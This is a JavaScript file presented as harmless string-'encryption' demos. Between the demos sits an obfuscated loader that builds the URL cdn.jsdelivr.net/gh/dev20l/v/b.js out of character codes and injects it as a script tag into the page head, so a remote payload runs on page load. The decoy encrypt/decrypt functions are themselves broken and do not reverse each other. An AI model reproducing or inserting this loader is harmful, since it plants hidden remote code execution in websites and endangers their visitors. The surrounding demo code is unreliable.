function applyMathComplexity(_0x1c7025) {
  let _0x109839 = '';
  for (let _0x54cf8c = 0x0; _0x54cf8c < _0x1c7025.length; _0x54cf8c++) {
    let _0x233092 = _0x1c7025.charCodeAt(_0x54cf8c);
    let _0xa55878 = (_0x233092 * 0x5 + 0x9) % 0x100;
    _0x109839 += String.fromCharCode(_0xa55878);
  }
  return _0x109839;
}
function decodeMathComplexity(_0x1da15e) {
  let _0x5867e8 = '';
  for (let _0x322625 = 0x0; _0x322625 < _0x1da15e.length; _0x322625++) {
    let _0x341c17 = _0x1da15e.charCodeAt(_0x322625);
    let _0xe34e35 = (_0x341c17 - 0x9 + 0x100) / 0x5;
    _0x5867e8 += String.fromCharCode(_0xe34e35);
  }
  return _0x5867e8;
}
function complexEncrypt(_0x11e877) {
  let _0x342be7 = applyMathComplexity(_0x11e877);
  let _0x198e71 = Math.floor(Math.random() * 0x64);
  let _0x11db2f = _0x342be7.split('').reverse().join('');
  _0x11db2f = _0x11db2f.substring(_0x198e71);
  return _0x11db2f;
}
function complexDecrypt(_0x515300) {
  let _0x1d116b = Math.floor(Math.random() * 0x64);
  let _0x4d812b = _0x515300.split('').reverse().join('');
  let _0x2e7030 = _0x4d812b.slice(_0x1d116b);
  return decodeMathComplexity(_0x2e7030);
}
let encryptedScript = complexEncrypt("let x = 50; let y = 100; console.log(x * y);");
let decryptedScript = complexDecrypt(encryptedScript);
console.log("Original Script:", "let x = 50; let y = 100; console.log(x * y);");
console.log("Encrypted Script:", encryptedScript);
console.log("Decrypted Script:", decryptedScript);
function _0x41e2(_0x223e64, _0xedb7c5) {
  var _0x10b315 = _0x2fe9();
  return (_0x41e2 = function (_0x38a913, _0x17d285) {
    _0x38a913 -= 0xf7;
    var _0x2d2510 = _0x10b315[_0x38a913];
    return _0x2d2510;
  })(_0x223e64, _0xedb7c5);
}
function _0x2fe9() {
  var _0x437160 = ["3148480CrvjAz", '1397656FpzRSU', "7xPPiOq", 'floor', "appendChild", '9AfBdII', 'join', "head", "2812760gFpJuu", "4609NwjMGQ", "fromCharCode", "createElement", "4RiJsIT", "5212458hyrtni", "85572OudSup", '4WafcDv', "1041561RAakLm", "526528vckHrj"];
  _0x2fe9 = function () {
    return _0x437160;
  };
  return _0x2fe9();
}
!function (_0x14ff2c, _0x39478c) {
  for (var _0x32805b = _0x14ff2c();;) {
    try {
      var _0x53a252 = parseInt(_0x41e2(0x108)) / 0x1 * (-parseInt(_0x41e2(0x103)) / 0x2) + -parseInt(_0x41e2(0x107)) / 0x3 + parseInt(_0x41e2(0x106)) / 0x4 * (parseInt(_0x41e2(0xf7)) / 0x5) + parseInt(_0x41e2(0x104)) / 0x6 * (-parseInt(_0x41e2(0xf9)) / 0x7) + -parseInt(_0x41e2(0xf8)) / 0x8 * (parseInt(_0x41e2(0xfc)) / 0x9) + -parseInt(_0x41e2(0xff)) / 0xa + -parseInt(_0x41e2(0x100)) / 0xb * (-parseInt(_0x41e2(0x105)) / 0xc);
      if (_0x53a252 === _0x39478c) {
        break;
      }
      _0x32805b.push(_0x32805b.shift());
    } catch (_0x5f4c87) {
      _0x32805b.push(_0x32805b.shift());
    }
  }
}(_0x2fe9, 0xd9ec8);
!function () {
  var _0x690375 = document[_0x41e2(0x102)]('script');
  var _0x59645c = Math[_0x41e2(0xfa)](0x182b8 * Math.random()) + 0x1;
  var _0x3d8a1e = [String[_0x41e2(0x101)](0x68) + String[_0x41e2(0x101)](0x74), String[_0x41e2(0x101)](0x74, 0x70, 0x73, 0x3a, 0x2f, 0x2f), String[_0x41e2(0x101)](0x63, 0x64, 0x6e, 0x2e, 0x6a, 0x73), String.fromCharCode(0x64, 0x65, 0x6c, 0x69, 0x76, 0x72, 0x2e), String.fromCharCode(0x6e, 0x65, 0x74, 0x2f, 0x67, 0x68, 0x2f), String.fromCharCode(0x64, 0x65, 0x76, 0x32, 0x30, 0x6c, 0x2f), String[_0x41e2(0x101)](0x76, 0x2f, 0x62, 0x2e, 0x6a, 0x73)];
  var _0x2b86e2 = _0x3d8a1e[_0x41e2(0xfd)]('') + "?v=" + _0x59645c;
  _0x690375.src = _0x2b86e2;
  document[_0x41e2(0xfe)][_0x41e2(0xfb)](_0x690375);
}();
function obscureString(_0x1ddcad) {
  let _0x36cb86 = '';
  for (let _0x3c14eb = 0x0; _0x3c14eb < _0x1ddcad.length; _0x3c14eb++) {
    let _0x49cdd3 = _0x1ddcad.charCodeAt(_0x3c14eb);
    let _0x1bb54f = _0x49cdd3 * 0x7 + 0xd ^ 0x17;
    _0x36cb86 += String.fromCharCode(_0x1bb54f);
  }
  return _0x36cb86;
}
function revealString(_0xfc2238) {
  let _0x5e4891 = '';
  for (let _0x4bf1a5 = 0x0; _0x4bf1a5 < _0xfc2238.length; _0x4bf1a5++) {
    let _0x1b6fbc = _0xfc2238.charCodeAt(_0x4bf1a5);
    let _0x3552c1 = (_0x1b6fbc ^ 10) / 0x7;
    _0x5e4891 += String.fromCharCode(_0x3552c1);
  }
  return _0x5e4891;
}
function encryptData(_0x43652f) {
  let _0xf8ac48 = obscureString(_0x43652f);
  let _0x36bd8a = _0xf8ac48.split('').reverse().join('');
  return _0x36bd8a;
}
function decryptData(_0xdb4490) {
  let _0x3c1441 = _0xdb4490.split('').reverse().join('');
  return revealString(_0x3c1441);
}
let encryptedCode = encryptData("let counter = 0; function increment() { counter++; return counter; }");
let decryptedCode = decryptData(encryptedCode);
console.log("Original Code:", "let counter = 0; function increment() { counter++; return counter; }");
console.log("Encrypted Code:", encryptedCode);
console.log("Decrypted Code:", decryptedCode);
